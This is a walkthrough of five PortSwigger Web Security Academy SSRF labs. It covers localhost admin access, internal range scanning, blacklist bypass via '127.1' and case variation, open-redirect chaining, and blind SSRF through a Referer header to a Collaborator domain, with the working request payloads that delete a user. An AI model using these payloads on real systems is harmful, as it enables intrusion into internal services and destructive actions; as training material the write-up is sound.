01 Basic SSRF against the local server
======================================

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at
http://localhost/admin and delete the user carlos.

References:

-   https://portswigger.net/web-security/ssrf

![img](media/e9084f2cdb7325c0d762a734aaf851eb.png)

There is a button to check the stock:

![img](media/8081b2e31f1db6dc45d4aa7c3073734b.png)

It generates this POST request:

![img](media/3d94c02a45475efce634255af0262047.png)

The stockApi parameter contains the url
“http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1”,
and we can tryo to change it to other url:

![img](media/76c5f7703c9a6d0a7248a5f4f15a2101.png)

For example we can check the content of the /admin page:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/66c9499168014159032c111080a4eae6.png)

From the source code we find using a GET request we can delete a user:

![img](media/5f7c6d2e47701789c7bb545524bd8d27.png)

So we can delete “carlos” with this payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin/delete?username=carlos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/aee0ee545ffc3cead1e4b6c1d590979b.png)

02 Basic SSRF against another back-end system
=============================================

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal
192.168.0.X range for an admin interface on port 8080, then use it to delete the
user carlos.

Generated link:
https://0aac00f403f0604981937fdd00f60012.web-security-academy.net/

POST request to check stock:

![img](media/3e5b11c5ceb6dfd0c2fd06d1dec0cbce.png)

Intruder:

![img](media/4b0ba95e22f82be2c77fb0226c72c6da.png)

.169 contains admin panel:

![img](media/17a0cb9dd053decd9a2d3d81dc38b110.png)

It seems it is possible to delete users with a GET request from the response:

![img](media/543fc5a500cfa9b8b587bdf76a82dc87.png)

We will add this to the request:

![img](media/35051cd382842e51d9b48a4c57192482.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...
stockApi=http%3A%2F%2F192.168.0.169%3A8080%2Fadmin/delete?username=carlos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

03 SSRF with blacklist-based input filter
=========================================

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at
http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to
bypass.

References:

-   https://portswigger.net/web-security/ssrf

![img](media/6f4ea68fdafc94dbea06d462cb64a8a2.png)

There is a button to check the stock:

![img](media/8081b2e31f1db6dc45d4aa7c3073734b.png)

It generates this POST request:

![img](media/d4099a927d34362528fcdb99e1e6bd78.png)

The stockApi parameter contains the url
“http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1”,
and we can tryo to change it to other url:

![img](media/76c5f7703c9a6d0a7248a5f4f15a2101.png)

It seems we can not use “http://127.0.0.1” or “http://localhost/”:

![img](media/311a4b48d9da5a1438743bbbe354bda6.png)

Using http://017700000001/ the error changes:

![img](media/c54f01e74e41346970c05c2636f605b1.png)

Using http://127.1 we can access the local server, for example we can access
/login. But we still can not access /admin, it gets detected.

![img](media/acba978af98611166e8a188a842e5989.png)

Using case variation, using ADMIN in uppercase, it is possible to access /admin:

![img](media/ad67cf8f6dac6942cd53dfbd1f8d74b4.png)

From the source code we find it is possible to delete the user with a GET
request with a payload like this:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...

stockApi=http://127.1/ADMIN/delete?username=carlos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/32fa70dc3e1e028845726f3ca907aa5f.png)

04 SSRF with filter bypass via open redirection vulnerability
=============================================================

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at
http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so
you will need to find an open redirect affecting the application first.

Reference: https://portswigger.net/web-security/ssrf

![img](media/6f527d94419e7fef0f37a81e1013f48c.png)

Generated link:
https://0abd004b03b8fa4e80328aba002a00f0.web-security-academy.net

![img](media/99e12c7958fbe57530b99068e48982b5.png)

POST request with data “stockApi=/product/stock/check?productId=1&storeId=1”

![img](media/74d52ba63cdf3b2ae3e82497141af43c.png)

The endpoint is reachable through a GET request in
https://0abd004b03b8fa4e80328aba002a00f0.web-security-academy.net/product/stock/check?productId=1&storeId=1
as well:

![img](media/9026df969d9ffe049c4425096515bd76.png)

There is a “Next product” button:

![img](media/668a3a51a9ba976e74b3bc81ebcd8572.png)

It uses the “path” parameter to set the id of the next product to display and
redirecto to that page:

![img](media/3784fdcb2cd03a0261ba9295cf756dc4.png)

We test the folowing payload and find the open redirection:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/8992df45aba7a609243534f3ad0effcc.png)

Now we will create a new POST request using this payload as the stockApi
parameter:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/2393bbdf510f673ad5e60c8a0b8d6333.png)

Reading the HTML code we see the user carlos can be deleted with a GET request
like http://192.168.0.12:8080/admin/delete?username=carlos

![img](media/9864a9641e4750f2e3740afe6e3fbe2c.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/f7b00227048921a8bbd763bce644f15c.png)

05 Blind SSRF with out-of-band detection
========================================

This site uses analytics software which fetches the URL specified in the Referer
header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public
Burp Collaborator server.

Note: To prevent the Academy platform being used to attack third parties, our
firewall blocks interactions between the labs and arbitrary external systems. To
solve the lab, you must use Burp Collaborator's default public server.

References:

-   https://portswigger.net/web-security/ssrf

![img](media/e285b2f975fc8afeec41ed21fbf11174.png)

Intercept the request when clicking a product and change the “Referer” header:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /product?productId=1 HTTP/2
...
Referer: http://snjtorvmsesj9itkltcgrqtsfjla92xr.oastify.com
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/3c8068b00ab77f4ae433669151a32aa3.png)

There are DNS and HTTP request to the Collaborator domain:

![img](media/2d33afeaf91d7fd2ca85cc4cbbab6804.png)
